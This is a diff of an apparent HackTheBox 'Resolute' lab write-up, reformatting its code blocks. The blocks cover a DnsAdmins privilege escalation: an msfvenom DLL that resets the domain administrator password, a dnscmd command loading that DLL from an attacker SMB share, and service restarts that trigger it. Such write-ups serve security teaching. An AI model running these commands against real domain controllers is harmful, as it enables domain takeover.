-<p><em>From an elevated command prompt,</em> type: <code class="language-plaintext highlighter-rouge">iisreset /restart</code></p>
+<p><em>From an elevated command prompt,</em> type:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iisreset /restart
+</code></pre></div></div>
 
 <hr />
 
@@ -2831,7 +2879,8 @@ Host script results:
 
 <p>we’re going to use a payload that doesn’t cause the <strong>DNS</strong> service to hang. It should be something simple like changing the the domain administrator’s password</p>
 
-<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/exec cmd='net user administrator $$Y0uJustG0tOwn3d$$ /domain' -f dll &gt; owned.dll</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s1">'net user administrator $$Y0uJustG0tOwn3d$$ /domain'</span> <span class="nt">-f</span> dll <span class="o">&gt;</span> owned.dll
+</code></pre></div></div>
 
 <p><img src="/assets/Resolute/killer-dll.jpg" alt="killer-dll" /></p>
 
@@ -2841,11 +2890,12 @@ Host script results:
 
 <p><em>after that,</em> we’re going to reconfigure the <strong>DNS</strong> service using <code class="language-plaintext highlighter-rouge">dnscmd</code> with the <code class="language-plaintext highlighter-rouge">/config</code> flag along with <code class="language-plaintext highlighter-rouge">/serverlevelplugindll</code> pointing to our <strong>SMB</strong> share named <code class="language-plaintext highlighter-rouge">share</code>. It should be as below:</p>
 
-<p><code class="language-plaintext highlighter-rouge">dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd /config /serverlevelplugindll \\10.10.16.3\share\adduser.dll
+</code></pre></div></div>
 
 <p>we can then trigger the execution by stopping the <strong>DNS</strong> service and restarting it.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe stop dns
 sc.exe start dns
 </code></pre></div></div>
 
